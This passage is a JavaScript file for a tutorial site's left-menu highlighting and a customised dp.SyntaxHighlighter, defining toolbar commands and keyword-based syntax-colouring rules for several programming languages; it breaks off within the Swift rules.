function highlightlink() {
  var e = window.location.href;
  var base_url = window.location.origin;
  for (
    var e = window.location.href,
    t = e.search("com"),
    s = e.replace( base_url + '/', "" ),
    r = document.querySelectorAll(".leftmenu > a"),
    i = 0;
    i < r.length;
    i++
  ){  //For making selected left-menu bold,we are removing forward-slash['/']
    r[i].getAttribute('href').slice(1).split('#')[0] == s.split('#')[0].replace( base_url, "" ) &&
      ((r[i].innerHTML =
        '<strong style="display:flex;width:150%;margin-left:-30px">' +
        r[i].textContent +
        '</strong>'),
        (r[i].style.color = "black"));
      }    
}

var dp = {
  sh: {
    Toolbar: {},
    Utils: {},
    RegexLib: {},
    Brushes: {},
    Strings: {
      AboutDialog:
        '<html><head><title>About...</title></head><body class="dp-about"><table cellspacing="0"><tr><td class="copy"><p class="title">dp.SyntaxHighlighter</div><div class="para">Version: {V}</p><p><a href="http://www.dreamprojections.com/syntaxhighlighter/?ref=about" target="_blank">http://www.dreamprojections.com/syntaxhighlighter</a></p>&copy;2009-2017 JavaTpoint.</td></tr><tr><td class="footer"><input type="button" class="close" value="OK" onClick="window.close()"/></td></tr></table></body></html>',
    },
    ClipboardSwf: null,
    Version: "1.5.1",
  },
};

(dp.SyntaxHighlighter = dp.sh),
  (dp.sh.Toolbar.Commands = {
    ExpandSource: {
      label: "+ expand source",
      check: function (e) {
        return e.collapse;
      },
      func: function (e, t) {
        e.parentNode.removeChild(e),
          (t.div.className = t.div.className.replace("collapsed", ""));
      },
    },
    ViewSource: {
      label: "",
      func: function (e, t) {
        var s = dp.sh.Utils.FixForBlogger(t.originalCode).replace(/</g, "&lt;"),
          r = window.open(
            "",
            "_blank",
            "width=300, height=400, location=0, resizable=1, menubar=0, scrollbars=0"
          );
        r.document.write(
          '<textarea style="width:99%;height:99%">' + s + "</textarea>"
        ),
          r.document.close();
      },
    },
    CopyToClipboard: {
      label: "",
      check: function () {
        return null != window.clipboardData || null != dp.sh.ClipboardSwf;
      },
      func: function (e, t) {
        var s = dp.sh.Utils.FixForBlogger(t.originalCode)
          .replace(/&lt;/g, "<")
          .replace(/&gt;/g, ">")
          .replace(/&amp;/g, "&");
        if (window.clipboardData) window.clipboardData.setData("text", s);
        else if (null != dp.sh.ClipboardSwf) {
          var r = t.flashCopier;
          null == r &&
            ((r = document.createElement("div")),
              (t.flashCopier = r),
              t.div.appendChild(r)),
            (r.innerHTML =
              '<embed src="' +
              dp.sh.ClipboardSwf +
              '" FlashVars="clipboard=' +
              encodeURIComponent(s) +
              '" width="0" height="0" type="application/x-shockwave-flash"></embed>');
        }
        alert("The code is in your clipboard now");
      },
    },
    PrintSource: {
      label: "",
      func: function (e, t) {
        var s = document.createElement("IFRAME"),
          r = null;
        (s.style.cssText =
          "position:absolute;width:0px;height:0px;left:-500px;top:-500px;"),
          document.body.appendChild(s),
          (r = s.contentWindow.document),
          dp.sh.Utils.CopyStyles(r, window.document),
          r.write(
            '<div class="' +
            t.div.className.replace("collapsed", "") +
            ' printing">' +
            t.div.innerHTML +
            "</div>"
          ),
          r.close(),
          s.contentWindow.focus(),
          s.contentWindow.print(),
          alert("Printing..."),
          document.body.removeChild(s);
      },
    },
    About: {
      label: "",
      func: function (e) {
        var t = window.open(
          "",
          "_blank",
          "dialog,width=300,height=150,scrollbars=0"
        ),
          s = t.document;
        dp.sh.Utils.CopyStyles(s, window.document),
          s.write(dp.sh.Strings.AboutDialog.replace("{V}", dp.sh.Version)),
          s.close(),
          t.focus();
      },
    },
  }),
  (dp.sh.Toolbar.Create = function (e) {

    var t = document.createElement("DIV");
    for (var s in ((t.className = "tools"), dp.sh.Toolbar.Commands)) {
      var r = dp.sh.Toolbar.Commands[s];
      (null == r.check || r.check(e)) &&
        (t.innerHTML +=
          '<a href="#" onclick="dp.sh.Toolbar.Command(\'' +
          s +
          "',this);return false;\">" +
          r.label +
          "</a>");
    }
    return t;
  }),
  (dp.sh.Toolbar.Command = function (e, t) {
    for (var s = t; null != s && -1 == s.className.indexOf("dp-highlighter");)
      s = s.parentNode;
    null != s && dp.sh.Toolbar.Commands[e].func(t, s.highlighter);
  }),
  (dp.sh.Utils.CopyStyles = function (e, t) {
    for (var s = t.getElementsByTagName("link"), r = 0; r < s.length; r++)
      "stylesheet" == s[r].rel.toLowerCase() &&
        e.write(
          '<link type="text/css" rel="stylesheet" href="' +
          s[r].href +
          '"></link>'
        );
  }),
  (dp.sh.Utils.FixForBlogger = function (e) {
    return 1 == dp.sh.isBloggerMode
      ? e.replace(/<br\s*\/?>|&lt;br\s*\/?&gt;/gi, "\n")
      : e;
  }),
  (dp.sh.RegexLib = {
    MultiLineCComments: new RegExp("/\\*[\\s\\S]*?\\*/", "gm"),
    SingleLineCComments: new RegExp("//.*$", "gm"),
    SingleLinePerlComments: new RegExp("#.*$", "gm"),
    DoubleQuotedString: new RegExp('"(?:\\.|(\\\\\\")|[^\\""\\n])*"', "g"),
    SingleQuotedString: new RegExp("'(?:\\.|(\\\\\\')|[^\\''\\n])*'", "g"),
  }),
  (dp.sh.Match = function (e, t, s) {
    (this.value = e),
      (this.index = t),
      (this.length = e.length),
      (this.css = s);
  }),
  (dp.sh.Highlighter = function () {
    (this.noGutter = !1),
      (this.addControls = !0),
      (this.collapse = !1),
      (this.tabsToSpaces = !0),
      (this.wrapColumn = 80),
      (this.showColumns = !0);
  }),
  (dp.sh.Highlighter.SortCallback = function (e, t) {
    return e.index < t.index
      ? -1
      : e.index > t.index
        ? 1
        : e.length < t.length
          ? -1
          : e.length > t.length
            ? 1
            : 0;
  }),
  (dp.sh.Highlighter.prototype.CreateElement = function (e) {
    var t = document.createElement(e);
    return (t.highlighter = this), t;
  }),
  (dp.sh.Highlighter.prototype.GetMatches = function (e, t) {
    for (var s = null; null != (s = e.exec(this.code));)
      this.matches[this.matches.length] = new dp.sh.Match(s[0], s.index, t);
  }),
  (dp.sh.Highlighter.prototype.AddBit = function (e, t) {
    if (null != e && 0 != e.length) {
      var s = this.CreateElement("SPAN");
      if (
        ((e = (e = (e = e.replace(/ /g, "&nbsp;")).replace(
          /</g,
          "&lt;"
        )).replace(/\n/gm, "&nbsp;<br>")),
          null != t)
      )
        if (/br/gi.test(e))
          for (var r = e.split("&nbsp;<br>"), i = 0; i < r.length; i++)
            ((s = this.CreateElement("SPAN")).className = t),
              (s.innerHTML = r[i]),
              this.div.appendChild(s),
              i + 1 < r.length &&
              this.div.appendChild(this.CreateElement("BR"));
        else (s.className = t), (s.innerHTML = e), this.div.appendChild(s);
      else (s.innerHTML = e), this.div.appendChild(s);
    }
  }),
  (dp.sh.Highlighter.prototype.IsInside = function (e) {
    if (null == e || 0 == e.length) return !1;
    for (var t = 0; t < this.matches.length; t++) {
      var s = this.matches[t];
      if (null != s && e.index > s.index && e.index < s.index + s.length)
        return !0;
    }
    return !1;
  }),
  (dp.sh.Highlighter.prototype.ProcessRegexList = function () {
    for (var e = 0; e < this.regexList.length; e++)
      this.GetMatches(this.regexList[e].regex, this.regexList[e].css);
  }),
  (dp.sh.Highlighter.prototype.ProcessSmartTabs = function (e) {
    var t = e.split("\n"),
      s = "",
      r = "\t";
    function i(e, t, s) {
      for (
        var r = e.substr(0, t), i = e.substr(t + 1, e.length), n = "", a = 0;
        a < s;
        a++
      )
        n += " ";
      return r + n + i;
    }
    function n(e, t) {
      if (-1 == e.indexOf(r)) return e;
      for (var s = 0; -1 != (s = e.indexOf(r));) e = i(e, s, t - (s % t));
      return e;
    }
    for (var a = 0; a < t.length; a++) s += n(t[a], 4) + "\n";
    return s;
  }),
  (dp.sh.Highlighter.prototype.SwitchToList = function () {
    var e = this.div.innerHTML.replace(/<(br)\/?>/gi, "\n").split("\n");
    if (
      (1 == this.addControls &&
        this.bar.appendChild(dp.sh.Toolbar.Create(this)),
        this.showColumns)
    ) {
      for (
        var t = this.CreateElement("div"), s = this.CreateElement("div"), r = 1;
        r <= 150;

      )
        r % 10 == 0
          ? ((t.innerHTML += r), (r += (r + "").length))
          : ((t.innerHTML += "&middot;"), r++);
      (s.className = "columns"), s.appendChild(t), this.bar.appendChild(s);
    }
    r = 0;
    for (var i = this.firstLine; r < e.length - 1; r++, i++) {
      var n = this.CreateElement("LI"),
        a = this.CreateElement("SPAN");
      (n.className = r % 2 == 0 ? "alt" : ""),
        (a.innerHTML = e[r] + "&nbsp;"),
        n.appendChild(a),
        this.ol.appendChild(n);
    }
    this.div.innerHTML = "";
  }),
  (dp.sh.Highlighter.prototype.Highlight = function (e) {
    var t,
      s,
      r,
      i = 0;
    if (
      (null == e && (e = ""),
        (this.originalCode = e),
        (this.code = (function (e) {
          for (
            var t,
            s = dp.sh.Utils.FixForBlogger(e).split("\n"),
            r = (new Array(), new RegExp("^\\s*", "g")),
            i = 1e3,
            n = 0;
            n < s.length && 0 < i;
            n++
          )
            if (0 != ((t = s[n]), t.replace(/^\s*(.*?)[\s\n]*$/g, "$1")).length) {
              var a = r.exec(s[n]);
              null != a && 0 < a.length && (i = Math.min(a[0].length, i));
            }
          if (0 < i) for (n = 0; n < s.length; n++) s[n] = s[n].substr(i);
          return s.join("\n");
        })(e)
          .replace(/\n*$/, "")
          .replace(/^\n*/, "")),
        (this.div = this.CreateElement("DIV")),
        (this.bar = this.CreateElement("DIV")),
        (this.ol = this.CreateElement("OL")),
        (this.matches = new Array()),
        (this.div.className = "dp-highlighter"),
        ((this.div.highlighter = this).bar.className = "bar"),
        (this.ol.start = this.firstLine),
        null != this.CssClass && (this.ol.className = this.CssClass),
        this.collapse && (this.div.className += " collapsed"),
        this.noGutter && (this.div.className += " nogutter"),
        1 == this.tabsToSpaces && (this.code = this.ProcessSmartTabs(this.code)),
        this.ProcessRegexList(),
        0 == this.matches.length)
    )
      return (
        this.AddBit(this.code, null),
        this.SwitchToList(),
        this.div.appendChild(this.bar),
        void this.div.appendChild(this.ol)
      );
    this.matches = this.matches.sort(dp.sh.Highlighter.SortCallback);
    for (var n = 0; n < this.matches.length; n++)
      this.IsInside(this.matches[n]) && (this.matches[n] = null);
    for (n = 0; n < this.matches.length; n++) {
      var a = this.matches[n];
      null != a &&
        0 != a.length &&
        (this.AddBit(
          ((t = this.code), (s = i), (r = a.index), t.substr(s, r - s)),
          null
        ),
          this.AddBit(a.value, a.css),
          (i = a.index + a.length));
    }
    this.AddBit(this.code.substr(i), null),
      this.SwitchToList(),
      this.div.appendChild(this.bar),
      this.div.appendChild(this.ol);
  }),
  (dp.sh.Highlighter.prototype.GetKeywords = function (e) {
    return "\\b" + e.replace(/ /g, "\\b|\\b") + "\\b";
  }),
  (dp.sh.BloggerMode = function () {
    dp.sh.isBloggerMode = !0;
  }),
  (dp.sh.HighlightAll = function (e, t, s, r, i, n) {
    function a() {
      for (var e = arguments, t = 0; t < e.length; t++)
        if (null != e[t]) {
          if ("string" == typeof e[t] && "" != e[t]) return e[t] + "";
          if ("object" == typeof e[t] && "" != e[t].value)
            return e[t].value + "";
        }
      return null;
    }
    function o(e, t) {
      for (var s = 0; s < t.length; s++) if (t[s] == e) return !0;
      return !1;
    }
    function l(e, t, s) {
      for (
        var r = new RegExp("^" + e + "\\[(\\w+)\\]$", "gi"), i = null, n = 0;
        n < t.length;
        n++
      )
        if (null != (i = r.exec(t[n]))) return i[1];
      return s;
    }
    function c(e, t, s) {
      for (var r = document.getElementsByTagName(s), i = 0; i < r.length; i++)
        r[i].getAttribute("name") == t && e.push(r[i]);
    }
    var d = [],
      p = null,
      h = {};
    if ((c(d, e, "pre"), c(d, e, "textarea"), 0 != d.length)) {
      for (var g in dp.sh.Brushes) {
        var u = dp.sh.Brushes[g].Aliases;
        if (null != u) for (var m = 0; m < u.length; m++) h[u[m]] = g;
      }
      for (m = 0; m < d.length; m++) {
        var f,
          _ = d[m],
          b = a(
            _.attributes.class,
            _.className,
            _.attributes.language,
            _.language
          );
        if (null != b && null != h[(f = (b = b.split(":"))[0].toLowerCase())]) {
          (p = new dp.sh.Brushes[h[f]]()),
            (_.style.display = "none"),
            (p.noGutter = null == t ? o("nogutter", b) : !t),
            (p.addControls = null == s ? !o("nocontrols", b) : s),
            (p.collapse = null == r ? o("collapse", b) : r),
            (p.showColumns = null == n ? o("showcolumns", b) : n);
          var y = document.getElementsByTagName("head")[0];
          if (p.Style && y) {
            var x = document.createElement("style");
            if ((x.setAttribute("type", "text/css"), x.styleSheet))
              x.styleSheet.cssText = p.Style;
            else {
              var w = document.createTextNode(p.Style);
              x.appendChild(w);
            }
            y.appendChild(x);
          }
          (p.firstLine = null == i ? parseInt(l("firstline", b, 1)) : i),
            p.Highlight(_.innerHTML),
            (p.source = _).parentNode.insertBefore(p.div, _);
        }
      }
    }
  }),
  (dp.sh.Brushes.Xml = function () {
    (this.CssClass = "dp-xml"),
      (this.Style =
        ".dp-xml .cdata { color: #ff1493; }.dp-xml .tag, .dp-xml .tag-name { color: #069; font-weight: bold; }.dp-xml .attribute { color: red; }.dp-xml .attribute-value { color: blue; }");
  }),
  (dp.sh.Brushes.Xml.prototype = new dp.sh.Highlighter()),
  (dp.sh.Brushes.Xml.Aliases = ["xml", "xhtml", "xslt", "html", "xhtml"]),
  (dp.sh.Brushes.Xml.prototype.ProcessRegexList = function () {
    function e(e, t) {
      e[e.length] = t;
    }
    var t = null,
      s = null;
    for (
      this.GetMatches(
        new RegExp("(&lt;|<)\\!\\[[\\w\\s]*?\\[(.|\\s)*?\\]\\](&gt;|>)", "gm"),
        "cdata"
      ),
      this.GetMatches(
        new RegExp("(&lt;|<)!--\\s*.*?\\s*--(&gt;|>)", "gm"),
        "comments"
      ),
      s = new RegExp(
        "([:\\w-.]+)\\s*=\\s*(\".*?\"|'.*?'|\\w+)*|(\\w+)",
        "gm"
      );
      null != (t = s.exec(this.code));

    )
      null != t[1] &&
        (e(this.matches, new dp.sh.Match(t[1], t.index, "attribute")),
          null != t[2] &&
          e(
            this.matches,
            new dp.sh.Match(
              t[2],
              t.index + t[0].indexOf(t[2]),
              "attribute-value"
            )
          ));
    for (
      this.GetMatches(
        new RegExp("(&lt;|<)/*\\?*(?!\\!)|/*\\?*(&gt;|>)", "gm"),
        "tag"
      ),
      s = new RegExp("(?:&lt;|<)/*\\?*\\s*([:\\w-.]+)", "gm");
      null != (t = s.exec(this.code));

    )
      e(
        this.matches,
        new dp.sh.Match(t[1], t.index + t[0].indexOf(t[1]), "tag-name-test")
      );
  }),
  (dp.sh.Brushes.Sql = function () {
    (this.regexList = [
      { regex: new RegExp("--(.*)$", "gm"), css: "comment" },
      { regex: dp.sh.RegexLib.DoubleQuotedString, css: "string" },
      { regex: dp.sh.RegexLib.SingleQuotedString, css: "string" },
      {
        regex: new RegExp(
          this.GetKeywords(
            "abs avg case cast coalesce convert count current_timestamp current_user day isnull left lower month nullif replace right session_user space substring sum system_user upper user year"
          ),
          "gmi"
        ),
        css: "func",
      },
      {
        regex: new RegExp(
          this.GetKeywords(
            "all and any between cross in join like not null or outer some"
          ),
          "gmi"
        ),
        css: "op",
      },
      {
        regex: new RegExp(
          this.GetKeywords(
            "absolute action add after alter as asc at authorization begin bigint binary bit by cascade char character check checkpoint close collate column commit committed connect connection constraint contains continue create cube current current_date current_time cursor database date deallocate dec decimal declare default delete desc distinct double drop dynamic else end end-exec escape except exec execute false fetch first float for force foreign forward free from full function global goto grant group grouping having hour ignore index inner insensitive insert instead int integer intersect into is isolation key last level load local max min minute modify move name national nchar next no numeric of off on only open option order out output partial password precision prepare primary prior privileges procedure public read real references relative repeatable restrict return returns revoke rollback rollup rows rule schema scroll second section select sequence serializable set size smallint static statistics table temp temporary then time timestamp to top transaction translation trigger true truncate uncommitted union unique update values varchar varying view when where with work"
          ),
          "gmi"
        ),
        css: "keyword",
      },
    ]),
      (this.CssClass = "dp-sql"),
      (this.Style =
        ".dp-sql .func { color: #ff1493; }.dp-sql .op { color: #808080; }");
  }),
  (dp.sh.Brushes.Sql.prototype = new dp.sh.Highlighter()),
  (dp.sh.Brushes.Sql.Aliases = ["sql"]),
  (dp.sh.Brushes.Python = function () {
    (this.regexList = [
      { regex: dp.sh.RegexLib.SingleLinePerlComments, css: "comment" },
      { regex: new RegExp("^\\s*@\\w+", "gm"), css: "decorator" },
      { regex: new RegExp("(['\"]{3})([^\\1])*?\\1", "gm"), css: "comment" },
      {
        regex: new RegExp('"(?!")(?:\\.|\\\\\\"|[^\\""\\n\\r])*"', "gm"),
        css: "string",
      },
      {
        regex: new RegExp("'(?!')*(?:\\.|(\\\\\\')|[^\\''\\n\\r])*'", "gm"),
        css: "string",
      },
      { regex: new RegExp("\\b\\d+\\.?\\w*", "g"), css: "number" },
      {
        regex: new RegExp(
          this.GetKeywords(
            "and assert break class continue def del elif else except exec finally for from global if import in is lambda not or pass print raise return try yield while"
          ),
          "gm"
        ),
        css: "keyword",
      },
      {
        regex: new RegExp(
          this.GetKeywords("None True False self cls class_"),
          "gm"
        ),
        css: "special",
      },
    ]),
      (this.CssClass = "dp-py"),
      (this.Style =
        ".dp-py .builtins { color: #ff1493; }.dp-py .magicmethods { color: #808080; }.dp-py .exceptions { color: brown; }.dp-py .types { color: brown; font-style: italic; }.dp-py .commonlibs { color: #8A2BE2; font-style: italic; }");
  }),
  (dp.sh.Brushes.Python.prototype = new dp.sh.Highlighter()),
  (dp.sh.Brushes.Python.Aliases = ["py", "python"]),
  (dp.sh.Brushes.Java = function () {
    (this.regexList = [
      { regex: dp.sh.RegexLib.SingleLineCComments, css: "comment" },
      { regex: dp.sh.RegexLib.MultiLineCComments, css: "comment" },
      { regex: dp.sh.RegexLib.DoubleQuotedString, css: "string" },
      { regex: dp.sh.RegexLib.SingleQuotedString, css: "string" },
      {
        regex: new RegExp("\\b([\\d]+(\\.[\\d]+)?|0x[a-f0-9]+)\\b", "gi"),
        css: "number",
      },
      {
        regex: new RegExp("(?!\\@interface\\b)\\@[\\$\\w]+\\b", "g"),
        css: "annotation",
      },
      { regex: new RegExp("\\@interface\\b", "g"), css: "keyword" },
      {
        regex: new RegExp(
          this.GetKeywords(
            "abstract assert boolean break byte case catch char class const continue default do double else enum extends false final finally float for goto if implements import instanceof int interface long native new null package private protected public return short static strictfp super switch synchronized this throw throws true transient try void volatile while"
          ),
          "gm"
        ),
        css: "keyword",
      },
    ]),
      (this.CssClass = "dp-j"),
      (this.Style =
        ".dp-j .annotation { color: #646464; }.dp-j .number { color: #C00000; }");
  }),
  (dp.sh.Brushes.Java.prototype = new dp.sh.Highlighter()),
  (dp.sh.Brushes.Java.Aliases = ["java"]),
  (dp.sh.Brushes.Kotlin = function () {
    (this.regexList = [
      { regex: dp.sh.RegexLib.SingleLineCComments, css: "comment" },
      { regex: dp.sh.RegexLib.MultiLineCComments, css: "comment" },
      { regex: dp.sh.RegexLib.DoubleQuotedString, css: "string" },
      { regex: dp.sh.RegexLib.SingleQuotedString, css: "string" },
      {
        regex: new RegExp("\\b([\\d]+(\\.[\\d]+)?|0x[a-f0-9]+)\\b", "gi"),
        css: "number",
      },
      {
        regex: new RegExp("(?!\\@interface\\b)\\@[\\$\\w]+\\b", "g"),
        css: "annotation",
      },
      { regex: new RegExp("\\@interface\\b", "g"), css: "keyword" },
      {
        regex: new RegExp(
          this.GetKeywords(
            "fun abstract assert boolean break byte case catch char class const continue default do double else enum extends false final finally float for goto if implements import instanceof int interface long native new null package private protected public return short static strictfp super switch synchronized this throw throws true transient try void volatile while"
          ),
          "gm"
        ),
        css: "keyword",
      },
    ]),
      (this.CssClass = "dp-j"),
      (this.Style =
        ".dp-j .annotation { color: #646464; }.dp-j .number { color: #C00000; }");
  }),
  (dp.sh.Brushes.Kotlin.prototype = new dp.sh.Highlighter()),
  (dp.sh.Brushes.Kotlin.Aliases = ["kotlin"]),
  (dp.sh.Brushes.Rust = function () {
    (this.regexList = [
      { regex: dp.sh.RegexLib.SingleLineCComments, css: "comment" },
      { regex: dp.sh.RegexLib.MultiLineCComments, css: "comment" },
      { regex: dp.sh.RegexLib.DoubleQuotedString, css: "string" },
      { regex: dp.sh.RegexLib.SingleQuotedString, css: "string" },
      {
        regex: new RegExp("\\b([\\d]+(\\.[\\d]+)?|0x[a-f0-9]+)\\b", "gi"),
        css: "number",
      },
      {
        regex: new RegExp("(?!\\@interface\\b)\\@[\\$\\w]+\\b", "g"),
        css: "annotation",
      },
      { regex: new RegExp("\\@interface\\b", "g"), css: "keyword" },
      {
        regex: new RegExp(
          this.GetKeywords(
            "abstract alignof become box do final macro offsetof override priv proc pure sizeof typeof unsized virtual yield as break const continue crate else enum extern false fn for if impl in let loop match mod move mut pub ref return Self self static struct super trait true type unsafe use where while"
          ),
          "gm"
        ),
        css: "keyword",
      },
    ]),
      (this.CssClass = "dp-j"),
      (this.Style =
        ".dp-j .annotation { color: #646464; }.dp-j .number { color: #C00000; }");
  }),
  (dp.sh.Brushes.Rust.prototype = new dp.sh.Highlighter()),
  (dp.sh.Brushes.Rust.Aliases = ["rust"]),
  (dp.sh.Brushes.Cpp = function () {
    (this.regexList = [
      { regex: dp.sh.RegexLib.SingleLineCComments, css: "comment" },
      { regex: dp.sh.RegexLib.MultiLineCComments, css: "comment" },
      { regex: dp.sh.RegexLib.DoubleQuotedString, css: "string" },
      { regex: dp.sh.RegexLib.SingleQuotedString, css: "string" },
      { regex: new RegExp("^ *#.*", "gm"), css: "preprocessor" },
      {
        regex: new RegExp(
          this.GetKeywords(
            "ATOM BOOL BOOLEAN BYTE CHAR COLORREF DWORD DWORDLONG DWORD_PTR DWORD32 DWORD64 FLOAT HACCEL HALF_PTR HANDLE HBITMAP HBRUSH HCOLORSPACE HCONV HCONVLIST HCURSOR HDC HDDEDATA HDESK HDROP HDWP HENHMETAFILE HFILE HFONT HGDIOBJ HGLOBAL HHOOK HICON HINSTANCE HKEY HKL HLOCAL HMENU HMETAFILE HMODULE HMONITOR HPALETTE HPEN HRESULT HRGN HRSRC HSZ HWINSTA HWND INT INT_PTR INT32 INT64 LANGID LCID LCTYPE LGRPID LONG LONGLONG LONG_PTR LONG32 LONG64 LPARAM LPBOOL LPBYTE LPCOLORREF LPCSTR LPCTSTR LPCVOID LPCWSTR LPDWORD LPHANDLE LPINT LPLONG LPSTR LPTSTR LPVOID LPWORD LPWSTR LRESULT PBOOL PBOOLEAN PBYTE PCHAR PCSTR PCTSTR PCWSTR PDWORDLONG PDWORD_PTR PDWORD32 PDWORD64 PFLOAT PHALF_PTR PHANDLE PHKEY PINT PINT_PTR PINT32 PINT64 PLCID PLONG PLONGLONG PLONG_PTR PLONG32 PLONG64 POINTER_32 POINTER_64 PSHORT PSIZE_T PSSIZE_T PSTR PTBYTE PTCHAR PTSTR PUCHAR PUHALF_PTR PUINT PUINT_PTR PUINT32 PUINT64 PULONG PULONGLONG PULONG_PTR PULONG32 PULONG64 PUSHORT PVOID PWCHAR PWORD PWSTR SC_HANDLE SC_LOCK SERVICE_STATUS_HANDLE SHORT SIZE_T SSIZE_T TBYTE TCHAR UCHAR UHALF_PTR UINT UINT_PTR UINT32 UINT64 ULONG ULONGLONG ULONG_PTR ULONG32 ULONG64 USHORT USN VOID WCHAR WORD WPARAM WPARAM WPARAM char bool short int __int32 __int64 __int8 __int16 long float double __wchar_t clock_t _complex _dev_t _diskfree_t div_t ldiv_t _exception _EXCEPTION_POINTERS FILE _finddata_t _finddatai64_t _wfinddata_t _wfinddatai64_t __finddata64_t __wfinddata64_t _FPIEEE_RECORD fpos_t _HEAPINFO _HFILE lconv intptr_t jmp_buf mbstate_t _off_t _onexit_t _PNH ptrdiff_t _purecall_handler sig_atomic_t size_t _stat __stat64 _stati64 terminate_function time_t __time64_t _timeb __timeb64 tm uintptr_t _utimbuf va_list wchar_t wctrans_t wctype_t wint_t signed"
          ),
          "gm"
        ),
        css: "datatypes",
      },
      {
        regex: new RegExp(
          this.GetKeywords(
            "break case catch class const __finally __exception __try const_cast continue private public protected __declspec default delete deprecated dllexport dllimport do dynamic_cast else enum explicit extern if for friend goto inline mutable naked namespace new noinline noreturn nothrow register reinterpret_cast return selectany sizeof static static_cast struct switch template this thread throw true false try typedef typeid typename union using uuid virtual void volatile whcar_t while"
          ),
          "gm"
        ),
        css: "keyword",
      },
    ]),
      (this.CssClass = "dp-cpp"),
      (this.Style =
        ".dp-cpp .datatypes { color: #2E8B57; font-weight: bold; }");
  }),
  (dp.sh.Brushes.Cpp.prototype = new dp.sh.Highlighter()),
  (dp.sh.Brushes.Cpp.Aliases = ["cpp", "c", "c++"]),
  (dp.sh.Brushes.Php = function () {
    (this.regexList = [
      { regex: dp.sh.RegexLib.SingleLineCComments, css: "comment" },
      { regex: dp.sh.RegexLib.MultiLineCComments, css: "comment" },
      { regex: dp.sh.RegexLib.DoubleQuotedString, css: "string" },
      { regex: dp.sh.RegexLib.SingleQuotedString, css: "string" },
      { regex: new RegExp("\\$\\w+", "g"), css: "vars" },
      {
        regex: new RegExp(
          this.GetKeywords(
            "abs acos acosh addcslashes addslashes array_change_key_case array_chunk array_combine array_count_values array_diff array_diff_assoc array_diff_key array_diff_uassoc array_diff_ukey array_fill array_filter array_flip array_intersect array_intersect_assoc array_intersect_key array_intersect_uassoc array_intersect_ukey array_key_exists array_keys array_map array_merge array_merge_recursive array_multisort array_pad array_pop array_product array_push array_rand array_reduce array_reverse array_search array_shift array_slice array_splice array_sum array_udiff array_udiff_assoc array_udiff_uassoc array_uintersect array_uintersect_assoc array_uintersect_uassoc array_unique array_unshift array_values array_walk array_walk_recursive atan atan2 atanh base64_decode base64_encode base_convert basename bcadd bccomp bcdiv bcmod bcmul bindec bindtextdomain bzclose bzcompress bzdecompress bzerrno bzerror bzerrstr bzflush bzopen bzread bzwrite ceil chdir checkdate checkdnsrr chgrp chmod chop chown chr chroot chunk_split class_exists closedir closelog copy cos cosh count count_chars date decbin dechex decoct deg2rad delete ebcdic2ascii echo empty end ereg ereg_replace eregi eregi_replace error_log error_reporting escapeshellarg escapeshellcmd eval exec exit exp explode extension_loaded feof fflush fgetc fgetcsv fgets fgetss file_exists file_get_contents file_put_contents fileatime filectime filegroup fileinode filemtime fileowner fileperms filesize filetype floatval flock floor flush fmod fnmatch fopen fpassthru fprintf fputcsv fputs fread fscanf fseek fsockopen fstat ftell ftok getallheaders getcwd getdate getenv gethostbyaddr gethostbyname gethostbynamel getimagesize getlastmod getmxrr getmygid getmyinode getmypid getmyuid getopt getprotobyname getprotobynumber getrandmax getrusage getservbyname getservbyport gettext gettimeofday gettype glob gmdate gmmktime ini_alter ini_get ini_get_all ini_restore ini_set interface_exists intval ip2long is_a is_array is_bool is_callable is_dir is_double is_executable is_file is_finite is_float is_infinite is_int is_integer is_link is_long is_nan is_null is_numeric is_object is_readable is_real is_resource is_scalar is_soap_fault is_string is_subclass_of is_uploaded_file is_writable is_writeable mkdir mktime nl2br parse_ini_file parse_str parse_url passthru pathinfo readlink realpath rewind rewinddir rmdir round str_ireplace str_pad str_repeat str_replace str_rot13 str_shuffle str_split str_word_count strcasecmp strchr strcmp strcoll strcspn strftime strip_tags stripcslashes stripos stripslashes stristr strlen strnatcasecmp strnatcmp strncasecmp strncmp strpbrk strpos strptime strrchr strrev strripos strrpos strspn strstr strtok strtolower strtotime strtoupper strtr strval substr substr_compare"
          ),
          "gmi"
        ),
        css: "func",
      },
      {
        regex: new RegExp(
          this.GetKeywords(
            "and or xor __FILE__ __LINE__ array as break case cfunction class const continue declare default die do else elseif empty enddeclare endfor endforeach endif endswitch endwhile extends for foreach function include include_once global if new old_function return static switch use require require_once var while __FUNCTION__ __CLASS__ __METHOD__ abstract interface public implements extends private protected throw"
          ),
          "gm"
        ),
        css: "keyword",
      },
    ]),
      (this.CssClass = "dp-c");
  }),
  (dp.sh.Brushes.Php.prototype = new dp.sh.Highlighter()),
  (dp.sh.Brushes.Php.Aliases = ["php"]),
  (dp.sh.Brushes.CSharp = function () {
    (this.regexList = [
      { regex: dp.sh.RegexLib.SingleLineCComments, css: "comment" },
      { regex: dp.sh.RegexLib.MultiLineCComments, css: "comment" },
      { regex: dp.sh.RegexLib.DoubleQuotedString, css: "string" },
      { regex: dp.sh.RegexLib.SingleQuotedString, css: "string" },
      { regex: new RegExp("^\\s*#.*", "gm"), css: "preprocessor" },
      {
        regex: new RegExp(
          this.GetKeywords(
            "abstract as base bool break byte case catch char checked class const continue decimal default delegate do double else enum event explicit extern false finally fixed float for foreach get goto if implicit in int interface internal is lock long namespace new null object operator out override params private protected public readonly ref return sbyte sealed set short sizeof stackalloc static string struct switch this throw true try typeof uint ulong unchecked unsafe ushort using virtual void while"
          ),
          "gm"
        ),
        css: "keyword",
      },
    ]),
      (this.CssClass = "dp-c"),
      (this.Style = ".dp-c .vars { color: #d00; }");
  }),
  (dp.sh.Brushes.CSharp.prototype = new dp.sh.Highlighter()),
  (dp.sh.Brushes.CSharp.Aliases = ["c#", "c-sharp", "csharp"]),
  (dp.sh.Brushes.Swift = function () {
    (this.regexList = [
      { regex: dp.sh.RegexLib.SingleLineCComments, css: "comment" },
      { regex: dp.sh.RegexLib.MultiLineCComments, css: "comment" },
      { regex: dp.sh.RegexLib.DoubleQuotedString, css: "string" },
      { regex: dp.sh.RegexLib.SingleQuotedString, css: "string" },
      { regex: new RegExp("^\\s*#.*", "gm"), css: "preprocessor" },
      {
        regex: new RegExp(
          this.GetKeywords(
            "associatedtype class deinit enum extension fileprivate func import init inout internal let open operator private protocol public static struct subscript typealias var break case continue default defer do else fallthrough for guard if in repeat return switch where while as Any catch false is nil rethrows super self Self throw throws true and try #available #colorLiteral #column #else #elseif #endif #file #fileLiteral #function #if #imageLiteral #line #selector and #sourceLocation associativity convenience dynamic didSet final get infix indirect lazy left mutating none nonmutating optional override postfix precedence prefix Protocol required right set Type unowned weak willSet"
          ),
          "gm"
        ),
        css: "keyword",
      },
    ]),
